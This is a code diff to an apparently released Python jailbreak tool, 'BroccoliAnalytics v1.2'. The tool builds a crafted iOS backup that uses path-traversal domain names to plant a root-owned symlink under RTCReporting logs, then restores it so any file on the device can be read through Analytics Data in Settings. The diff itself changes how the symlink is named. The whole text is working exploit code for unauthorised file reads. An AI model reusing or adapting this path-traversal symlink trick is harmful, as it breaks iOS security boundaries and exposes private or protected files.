@@ -7,7 +7,7 @@ from pathlib import Path
 def create_haxxed_symlink(filename: str, target_fp: str):
     back = backup.Backup(files=[
         backup.Directory("", "SysContainerDomain-../../../../../../../../var/mobile/Library/Logs/RTCReporting/", owner=501, group=250),
-        backup.SymbolicLink("", f"SysContainerDomain-../../../../../../../../var/mobile/Library/Logs/RTCReporting/BroccoliAnalytics-{filename}.txt", f"{target_fp}", owner=0, group=250)
+        backup.SymbolicLink("", f"SysContainerDomain-../../../../../../../../var/mobile/Library/Logs/RTCReporting/{filename}.txt", f"{target_fp}", owner=0, group=250)
     ])
 
     with TemporaryDirectory() as backup_dir:
@@ -19,12 +19,12 @@ def create_haxxed_symlink(filename: str, target_fp: str):
             mb.restore(backup_dir, system=True, reboot=False, copy=False, source=".")
 
 print("""
-        BroccoliAnalytics v1.1
+        BroccoliAnalytics v1.2
   Written by the jailbreak.party team
     Exploit discovered by Duy Tran
 """)
 target = input("Enter the full path to the file you'd like to read: ")
-filename = target.split('/')[-1]
+filename = input("Enter a unique name for the symlink (this will be shown in Analytics Data): ")
 create_haxxed_symlink(filename=filename, target_fp=target)
-print(f"Success! (probably)\nYou should see a BrocoAnalytics-{filename}.txt file under Analytics Data in Settings.")
+print(f"Success! (probably)\nYou should see a {filename}.txt file under Analytics Data in Settings.")
 exit()
